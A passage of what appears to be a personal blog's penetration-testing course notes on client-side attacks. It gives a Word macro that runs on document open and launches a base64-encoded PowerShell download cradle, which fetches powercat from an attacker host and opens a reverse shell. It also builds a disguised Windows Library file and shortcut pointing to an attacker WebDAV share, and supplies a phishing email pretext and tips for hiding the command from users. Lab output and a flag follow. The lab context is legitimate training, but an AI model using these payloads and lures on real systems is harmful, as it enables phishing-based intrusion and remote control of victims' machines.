+&lt;li&gt;&lt;em&gt;A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;At this point &lt;code&gt;MyMacro()&lt;/code&gt; is an emptly sub proceedure with several single line comments starting with &lt;code&gt;!&lt;/code&gt; chars.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Sub MyMacro()
+&amp;#39;
+&amp;#39; MyMacro Macro
+&amp;#39;
+&amp;#39;
+
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;In this example we will use ActiveX Objects.&lt;ul&gt;
+&lt;li&gt;They provide access to underlying system commands.&lt;/li&gt;
+&lt;li&gt;Achieved through the &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31%28v=vs.84%29&quot; title=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31(v=vs.84)&quot;&gt;WScript&lt;/a&gt; through the &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99%28v=vs.84%29&quot; title=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99(v=vs.84)&quot;&gt;Windows Script Host Shell object&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Once the &lt;a href=&quot;https://learn.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function&quot;&gt;Windows Host Shell object with CreateObject&lt;/a&gt; you can invoke the Run method for WScript.Shell to run applications on the client machine.&lt;/li&gt;
+&lt;li&gt;Our first macro will start powershell.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Sub MyMacro()
+
+  CreateObject(&amp;quot;Wscript.Shell&amp;quot;).Run &amp;quot;powershell&amp;quot;
+  
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Office macros are not executed automatically.&lt;ul&gt;
+&lt;li&gt;We must use the predefined AutoOpen macro and Document_Open event.&lt;ul&gt;
+&lt;li&gt;This will call our proceedure and run our code when the doc is opened.&lt;/li&gt;
+&lt;li&gt;They differ and cover special cases which the other doesn&amp;#39;t so use both.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject(&amp;quot;Wscript.Shell&amp;quot;).Run &amp;quot;powershell&amp;quot;
+  
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Save, close, and reopen the doc.&lt;/li&gt;
+&lt;li&gt;We must click the Enable Content button, then our macro runs opening powershell!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will extend the code execution of our macro to spawn a reverse shell with powercat. We will need to use a base64 download cradle to dl powercat and start the rev shell. The encoded PowerShell command will be declared as a variable in VBA.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Note that VBA has a 255 char limit for literal strings&lt;/strong&gt; so we can&amp;#39;t load the command as a single string.&lt;ul&gt;
+&lt;li&gt;This does not apply to strings stored in variables.&lt;/li&gt;
+&lt;li&gt;Split the command into multiple lines and concatenate them in VB.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Go back to our macro editor.&lt;/li&gt;
+&lt;li&gt;Declare a var names Str with the Dim keyword.&lt;ul&gt;
+&lt;li&gt;Used to store our powershell download cradle.&lt;/li&gt;
+&lt;li&gt;Will be used to execute rev shell.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject(&amp;quot;Wscript.Shell&amp;quot;).Run Str
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We will need to encode this powershell command to base64.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.223/powercat.ps1&amp;#39;);powercat -c 192.168.45.223 -p 4444 -e powershell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Encode to Base64 string with powershell.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Split into smaller segments of 50 chars with Python.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;str = &amp;quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...&amp;quot;
+
+n = 50
+
+for i in range(0, len(str), n):
+    print(&amp;quot;Str = Str + &amp;quot; + &amp;#39;&amp;quot;&amp;#39; + str[i:i+n] + &amp;#39;&amp;quot;&amp;#39;)
+
+Str = Str + &amp;quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd&amp;quot;
+Str = Str + &amp;quot;wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA&amp;quot;
+Str = Str + &amp;quot;uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA&amp;quot;
+Str = Str + &amp;quot;GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI&amp;quot;
+Str = Str + &amp;quot;ALgAxADYAOAAuADQANQAuADIAMgAzAC8AcABvAHcAZQByAGMAY&amp;quot;
+Str = Str + &amp;quot;QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB&amp;quot;
+Str = Str + &amp;quot;jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACAALQBwA&amp;quot;
+Str = Str + &amp;quot;CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw&amp;quot;
+Str = Str + &amp;quot;A&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can use this to update our macro.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    Str = Str + &amp;quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd&amp;quot;
+    Str = Str + &amp;quot;wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA&amp;quot;
+    Str = Str + &amp;quot;uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA&amp;quot;
+    Str = Str + &amp;quot;GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI&amp;quot;
+    Str = Str + &amp;quot;ALgAxADYAOAAuADQANQAuADIAMgAzAC8AcABvAHcAZQByAGMAY&amp;quot;
+    Str = Str + &amp;quot;QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB&amp;quot;
+    Str = Str + &amp;quot;jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACAALQBwA&amp;quot;
+    Str = Str + &amp;quot;CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw&amp;quot;
+    Str = Str + &amp;quot;A&amp;quot;
+
+    CreateObject(&amp;quot;Wscript.Shell&amp;quot;).Run Str
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Once the macro has been saved, start a netcast listener, and close then reopen the document.&lt;ul&gt;
+&lt;li&gt;You can also run the macro from VBA editor to test the function.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Note that once the macro warning has been enabled, it won&amp;#39;t appear again unless the name of the doc changes.&lt;/li&gt;
+&lt;li&gt;Provided we get the target to run the macro, this is a very effective and reliable method.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;11.3 Abusing Windows Library Files&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Prepare an attack with Windows library files.&lt;/li&gt;
+&lt;li&gt;Leverage Windows shortcuts to obtain code execution.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Attaining Code Execution via Windows Library Files&lt;/h6&gt;
+&lt;p&gt;Win Library files are virtual containers that connect users with content stored in remote locations;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Web servers.&lt;/li&gt;
+&lt;li&gt;Shares.&lt;/li&gt;
+&lt;li&gt;They have a &lt;code&gt;.Library-ms&lt;/code&gt; file extension.&lt;/li&gt;
+&lt;li&gt;Are executed by double-clicking from explorer.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will explore a 2 stage client-side attack;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;First stage;&lt;ul&gt;
+&lt;li&gt;Leverage a Win Library file to gain a foothold on a target system.&lt;/li&gt;
+&lt;li&gt;Use it to setup the second stage.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Second stage;&lt;ul&gt;
+&lt;li&gt;Use the foothold to provide and executable file.&lt;/li&gt;
+&lt;li&gt;Spawn a reverse shell when double-clicked.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;First stage;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Setup a Win Library file that connects to a WebDAV share we control.&lt;/li&gt;
+&lt;li&gt;The victim with receive a &lt;code&gt;.Library-ms&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Through email for example.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;When the DC the file it will appear as a regular directory in explorer.&lt;ul&gt;
+&lt;li&gt;We will provide a &lt;code&gt;.lnk&lt;/code&gt; payload for the second stage powershell rev shell script.&lt;/li&gt;
+&lt;li&gt;We need to convince the user to click the &lt;code&gt;.lnk&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;This method is stealthier than delivering the lnk through a web server/email link since most spam filters and security appliances analyze links for suspicious content before passing them to recipient&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;On the other hand, most spam/sec systems will allow Win Library files through.&lt;ul&gt;
+&lt;li&gt;It also appears as a normal directory in explorer, giving the appearance of a local file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Setup our WebDAV share.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ pip3 install wsgidav           
+Defaulting to user installation because normal site-packages is not writeable
+Collecting wsgidav
+  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.3/171.3 KB 1.6 MB/s eta 0:00:00
+...  
+Successfully installed json5-0.9.6 wsgidav-4.0.1  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;After WsgiDAV install create &lt;code&gt;/home/kali/webdav&lt;/code&gt; for the share.&lt;ul&gt;
+&lt;li&gt;This will contain out &lt;code&gt;.lnk&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Place &lt;code&gt;test.txt&lt;/code&gt; there for now.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;If the installation of WsgiDAV fails with error: externally-managed-environment, we can use a virtual environment or install the package python3-wsgidav with apt. In PEP 668, a change was introduced to enforce the use of virtual environments and prevent situations in which package installations via pip break the operating system.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Run WsgiDAV from the &lt;code&gt;/home/kali/.local/bin&lt;/code&gt; dir or Apt install via path.&lt;ul&gt;
+&lt;li&gt;Specify host to serve from &lt;code&gt;-H&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0.0.0.0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Specify listening port &lt;code&gt;-p 80&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Disable auth &lt;code&gt;--auth anonymous&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Set WebDAV root &lt;code&gt;-r /home/kali/webdav&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/win-library-files]
+└─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
+Running without configuration file.
+12:54:48.073 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+12:54:48.075 - INFO    : WsgiDAV/4.2.0 Python/3.11.4 Linux-6.3.0-kali1-amd64-x86_64-with-glibc2.37
+12:54:48.076 - INFO    : Lock manager:      LockManager(LockStorageDict)
+12:54:48.076 - INFO    : Property manager:  None
+12:54:48.076 - INFO    : Domain controller: SimpleDomainController()
+12:54:48.076 - INFO    : Registered DAV providers by route:
+12:54:48.076 - INFO    :   - &amp;#39;/:dir_browser&amp;#39;: FilesystemProvider for path &amp;#39;/home/operator/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs&amp;#39; (Read-Only) (anonymous)
+12:54:48.076 - INFO    :   - &amp;#39;/&amp;#39;: FilesystemProvider for path &amp;#39;/home/operator/webdav&amp;#39; (Read-Write) (anonymous)
+12:54:48.076 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+12:54:48.076 - WARNING : Share &amp;#39;/&amp;#39; will allow anonymous write access.
+12:54:48.076 - WARNING : Share &amp;#39;/:dir_browser&amp;#39; will allow anonymous read access.
+12:54:48.160 - INFO    : Running WsgiDAV/4.2.0 Cheroot/10.0.0 Python 3.11.4
+12:54:48.160 - INFO    : Serving on http://0.0.0.0:80 ... 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Test from local browser.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Next we create the Win Library file from our Win VM.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Using VSCode or Notepad create text file &lt;code&gt;config.Library-ms&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Change the icon appearance to make it unassuming.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Library files consist of 3 parts.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;General Library information.&lt;/li&gt;
+&lt;li&gt;Library properties.&lt;/li&gt;
+&lt;li&gt;Library locations.&lt;/li&gt;
+&lt;li&gt;Refer to &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry&quot;&gt;Library Description Schema&lt;/a&gt; for further info.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;libraryDescription xmlns=&amp;quot;http://schemas.microsoft.com/windows/2009/library&amp;quot;&amp;gt;
+
+&amp;lt;/libraryDescription&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Set the &lt;code&gt;name&lt;/code&gt; tag.&lt;ul&gt;
+&lt;li&gt;NOTE this is not an arbitrary name.&lt;/li&gt;
+&lt;li&gt;We MUST specify the name by providing a DLL name and index.&lt;/li&gt;
+&lt;li&gt;We can use either name specified in MS docs;&lt;ul&gt;
+&lt;li&gt;@shell32.dll,-34575.&lt;/li&gt;
+&lt;li&gt;@windows.storage.dll,-34582.&lt;ul&gt;
+&lt;li&gt;We will use this on to prevent filters hitting on the word &lt;code&gt;shell32&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;version&lt;/code&gt; tag is set to a numerical val of our choice.&lt;ul&gt;
+&lt;li&gt;I.e. - &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;name&amp;gt;@windows.storage.dll,-34582&amp;lt;/name&amp;gt;
+&amp;lt;version&amp;gt;6&amp;lt;/version&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Add the &lt;code&gt;isLibraryPinned&lt;/code&gt; tag to &lt;code&gt;true&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;This pins the Lib to the nav pane of Win Explorer.&lt;/li&gt;
+&lt;li&gt;Another small detail that makes the process more genuine to the target.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;To set the icon appearance we set &lt;code&gt;iconRefernce&lt;/code&gt; the same way as we set the name.&lt;ul&gt;
+&lt;li&gt;Use &lt;code&gt;imageres.dll&lt;/code&gt; to choose between all Win icons.&lt;/li&gt;
+&lt;li&gt;Index &lt;code&gt;-1002&lt;/code&gt; for the Documents folder icon.&lt;/li&gt;
+&lt;li&gt;Index &lt;code&gt;-1003&lt;/code&gt; for the Pictures folder icon.&lt;ul&gt;
+&lt;li&gt;This looks more benign.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;isLibraryPinned&amp;gt;true&amp;lt;/isLibraryPinned&amp;gt;
+&amp;lt;iconReference&amp;gt;imageres.dll,-1003&amp;lt;/iconReference&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Add &lt;code&gt;templateInfo&lt;/code&gt; tag which contains &lt;code&gt;folderType&lt;/code&gt; tag.&lt;ul&gt;
+&lt;li&gt;These determine the columns and details that appear in Explorer by default when opening the Lib.&lt;/li&gt;
+&lt;li&gt;The GUID must be specified using MS docs page.&lt;/li&gt;
+&lt;li&gt;We wil use the Documents GUID to appear convincing.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;templateInfo&amp;gt;
+&amp;lt;folderType&amp;gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&amp;lt;/folderType&amp;gt;
+&amp;lt;/templateInfo&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The next tag marks the beginning of the library locations section.&lt;ul&gt;
+&lt;li&gt;Specifies the storage location where our library points to.&lt;/li&gt;
+&lt;li&gt;Start with the &lt;code&gt;searchConnectorDescriptionList&lt;/code&gt; tag.&lt;ul&gt;
+&lt;li&gt;Contains a list of search connectors defined by &lt;code&gt;searchConnectorDescription&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Search connects are used by library files to specify connection setting of remote location.&lt;/li&gt;
+&lt;li&gt;We can specify one or more inside the &lt;code&gt;searchConnectorDescriptionList&lt;/code&gt; tag.&lt;/li&gt;
+&lt;li&gt;First add the &lt;code&gt;isDefaultSaveLocation&lt;/code&gt; tag set to &lt;code&gt;true&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Determines behavior when user saves an item.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Next add &lt;code&gt;isSupported&lt;/code&gt; tag, which is NOT documented, and is used for compatibility set to &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Most important is the &lt;code&gt;url&lt;/code&gt; tag pointing to our WebDAV.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;searchConnectorDescriptionList&amp;gt;
+&amp;lt;searchConnectorDescription&amp;gt;
+&amp;lt;isDefaultSaveLocation&amp;gt;true&amp;lt;/isDefaultSaveLocation&amp;gt;
+&amp;lt;isSupported&amp;gt;false&amp;lt;/isSupported&amp;gt;
+&amp;lt;simpleLocation&amp;gt;
+&amp;lt;url&amp;gt;http://192.168.45.223&amp;lt;/url&amp;gt;
+&amp;lt;/simpleLocation&amp;gt;
+&amp;lt;/searchConnectorDescription&amp;gt;
+&amp;lt;/searchConnectorDescriptionList&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Our Library is working as expected.&lt;ul&gt;
+&lt;li&gt;Only config is shown in the nav bar, no indication it is remote!&lt;/li&gt;
+&lt;li&gt;When we reopen in editor, we see that Win modified the connection info to optimize it.&lt;ul&gt;
+&lt;li&gt;New &lt;code&gt;serialized&lt;/code&gt; tag added.&lt;ul&gt;
+&lt;li&gt;Base64-encoded info about the location of the url tag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The content of the &lt;code&gt;url&lt;/code&gt; tag has changed to &lt;code&gt;\\192.168.119.2\DavWWWRoot&lt;/code&gt; optimized for Win WebDAV Client.&lt;/li&gt;
+&lt;li&gt;This can cause the connection failures on the target, so revert to pre-run state before delivery.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;libraryDescription xmlns=&amp;quot;http://schemas.microsoft.com/windows/2009/library&amp;quot;&amp;gt;
+&amp;lt;name&amp;gt;@windows.storage.dll,-34582&amp;lt;/name&amp;gt;
+&amp;lt;version&amp;gt;6&amp;lt;/version&amp;gt;
+&amp;lt;isLibraryPinned&amp;gt;true&amp;lt;/isLibraryPinned&amp;gt;
+&amp;lt;iconReference&amp;gt;imageres.dll,-1003&amp;lt;/iconReference&amp;gt;
+&amp;lt;templateInfo&amp;gt;
+&amp;lt;folderType&amp;gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&amp;lt;/folderType&amp;gt;
+&amp;lt;/templateInfo&amp;gt;
+&amp;lt;searchConnectorDescriptionList&amp;gt;
+&amp;lt;searchConnectorDescription&amp;gt;
+&amp;lt;isDefaultSaveLocation&amp;gt;true&amp;lt;/isDefaultSaveLocation&amp;gt;
+&amp;lt;isSupported&amp;gt;false&amp;lt;/isSupported&amp;gt;
+&amp;lt;simpleLocation&amp;gt;
+&amp;lt;url&amp;gt;http://192.168.45.223&amp;lt;/url&amp;gt;
+&amp;lt;/simpleLocation&amp;gt;
+&amp;lt;/searchConnectorDescription&amp;gt;
+&amp;lt;/searchConnectorDescriptionList&amp;gt;
+&amp;lt;/libraryDescription&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now we need to create our &lt;code&gt;.lnk&lt;/code&gt; file and add it to the WebDAV share.&lt;ul&gt;
+&lt;li&gt;Right click on desktop.&lt;/li&gt;
+&lt;li&gt;Create new shortcut.&lt;/li&gt;
+&lt;li&gt;Point the shorcut to powershell and use another download cradle to load powercat and start the rev shell.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;powershell.exe -c &amp;quot;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.223:8000/powercat.ps1&amp;#39;); powercat -c 192.168.45.223 -p 4444 -e powershell&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;If the target is tech savy, place a benign command in front of our rev shell command pushing it out of the visible area of the property menu.&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Name the shortcut &lt;code&gt;automatic_configuration&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To test;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Start a netcat listener.&lt;/li&gt;
+&lt;li&gt;Start the Python HTTP server to deliver powercat.ps1.&lt;/li&gt;
+&lt;li&gt;Double click the shortcut.&lt;/li&gt;
+&lt;li&gt;We receive a rev shell!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Execute the attack;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use our webdav share to transfer the config.Library-ms and lnk file to our attacker machine.&lt;/li&gt;
+&lt;li&gt;IRL we would use a pretext and likely email as the delivery method, example;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Hello! My name is Dwight, and I&amp;#39;m a new member of the IT Team. 
+
+This week I am completing some configurations we rolled out last week.
+To make this easier, I&amp;#39;ve attached a file that will automatically
+perform each step. Could you download the attachment, open the
+directory, and double-click &amp;quot;automatic_configuration&amp;quot;? Once you
+confirm the configuration in the window that appears, you&amp;#39;re all done!
+
+If you have any questions, or run into any problems, please let me
+know!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;In this case we will use WebDAV to simulate the delivery method in our lab.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;smbclient&lt;/code&gt; with the &lt;code&gt;-c&lt;/code&gt; param to specify &lt;code&gt;&amp;#39;put config.Library-ms&amp;#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/webdav]
+└─$ ls
+automatic_configuration.lnk  config.Library-ms
+                                                                                         
+┌──(operator㉿labhost)-[~/webdav]
+└─$ smbclient //192.168.206.195/share -c &amp;#39;put config.Library-ms&amp;#39;
+Password for [WORKGROUP\operator]:
+putting file config.Library-ms as \config.Library-ms (2.8 kb/s) (average 2.8 kb/s)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A simulated user executes the file and we get a shell!&lt;/p&gt;
+&lt;p&gt;Follow the steps in this section to get code execution on the HR137 (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a .lnk file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the hsmith user. You can use VM #1 of VM Group 1 to build the library file and shortcut.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Users\hsmith\Desktop&amp;gt; cat flag.txt
+cat flag.txt
+OS{e136120db43d939e68a8715d8c682b13}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Answer the following question with true or false: Is the .lnk file tagged with the &amp;quot;Mark of the Web&amp;quot; when you execute it in Explorer by double-clicking the Windows library file?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-true&quot;&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;../assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;../blog/public-exploits.html&quot;
+        data-default-href=&quot;../blog/public-exploits.html&quot;
+        data-default-fragment=&quot;../blog/fragments/public-exploits.html&quot;
+        data-fragment-href=&quot;../blog/fragments/public-exploits.html&quot;
+        data-target-slug=&quot;public-exploits&quot;
+        data-post-slug=&quot;public-exploits&quot;
+      &gt;
